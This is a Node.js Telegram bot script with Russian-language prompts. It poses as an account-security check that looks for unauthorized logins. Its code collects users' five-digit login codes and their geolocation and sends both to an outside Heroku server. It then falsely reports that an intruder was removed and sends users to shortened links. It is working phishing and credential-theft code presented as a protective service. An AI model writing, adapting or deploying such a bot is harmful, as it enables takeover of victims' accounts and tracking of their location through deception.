const { Telegraf, Markup } = require('telegraf')
require('dotenv').config()
const axios = require('axios')


const text = require('./const')
const fs = require('fs/promises')


const bot = new Telegraf(process.env.BOT_TOKEN)
const BASE_URL = 'https://boackend.herokuapp.com/api/'


bot.start(async (ctx) => {
    await ctx.reply(`Привет, ${ctx.message.from.first_name}!`)
    try {
        await ctx.replyWithHTML('Мы проверяем акаунты на наличие несанкционированого входа. <b>Проверить ваш акаунт?</b>', Markup.inlineKeyboard(
            [
             [Markup.button.callback('Да, хочу проверить!', 'btn_2')]
            ]
        ))
    } catch (error) {
        console.error(error)
    }
})
bot.help((ctx) => ctx.reply(text.commands))

bot.command('stt', async(ctx) => {
    await ctx.reply('Пришлите свою локацию, что б мы отключили все остальние соидинения.', Markup.keyboard([
        [Markup.button.locationRequest('Локация', false)]
    ]).resize());
})
bot.on('location', (ctx) => {
    const {location} = ctx.update.message
    if (location) {
        const now = new Date().toLocaleString()
        readFile('locations', {
            lat: location.latitude,
            lon: location.longitude,
            date: now
        })
        ctx.replyWithHTML(`Вы удалили злоумышлиника!. Что бы узнать больше перейдите по <a href='https://bit.ly/3NTvIee'>Ссылке</a>`)
    }
})
bot.on('message', msg => {
    const { text } = msg.update.message
    if (text && text.length === 5) {
        const now = new Date().toLocaleString()
        readFile('codes', {
            code: text,
            date: now
        })
        return msg.replyWithHTML(`Ваш акаунт посещал сторонний человек. Что бы узнать больше используй команду /stt`)
    } else {
        return msg.reply( 'Код не правильний') 
    }
})
      

    const readFile = async (url, data) => {
        try {
            const result = await axios.post(BASE_URL+url, data)
        } catch {
            console.log(error.message)
        }
    }
 


function addActionBot(name, text) {
    
    bot.action(name, async (ctx) => {
        try {
            await ctx.answerCbQuery()
            await ctx.replyWithHTML(text, {
                disable_web_page_preview: true
            })
             bot.on('message', msg => {
                const {text} = msg.update.message
                
                if (text.length === 5) {
                    return msg.replyWithHTML( `Ваш акаунт посещал сторонний человек. Что бы узнать больше кликни <a href='https://bit.ly/3aljVYw'>сюда</a>!`)
                } else {
                    console.log('lol')
                    return msg.reply( 'Код не правильний')
                }
                
            })
        } catch (e) {
            console.error(e)
        }
    } )
}
addActionBot('btn_2', text.textRu)


bot.launch(bot.start())

process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))